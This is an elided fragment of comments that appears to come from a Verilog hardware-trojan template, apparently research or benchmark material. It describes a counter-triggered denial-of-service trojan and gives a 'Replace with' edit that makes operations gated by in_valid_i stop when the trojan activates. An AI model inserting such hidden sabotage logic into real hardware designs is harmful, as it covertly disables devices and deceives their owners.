 ...
 * 
 * Description:
 *   Disables operations by blocking in_valid_i control signal
 *   
 * Trigger: Counter on in_valid_i
 * Payload: Block in_valid_i when trojan activates
 * 
...
// ============================================================
// DoS Attack: Block in_valid_i when trojan is active
//
// IMPORTANT: in_valid_i is an INPUT signal - we CANNOT assign to it!
...
//   
//   Replace with:
//     if (in_valid_i && !trojan_active) begin
//
// Effect: When trojan_active = 1:
//   Condition becomes: in_valid_i && 0 = 0 (always false)
//   All operations controlled by in_valid_i are blocked
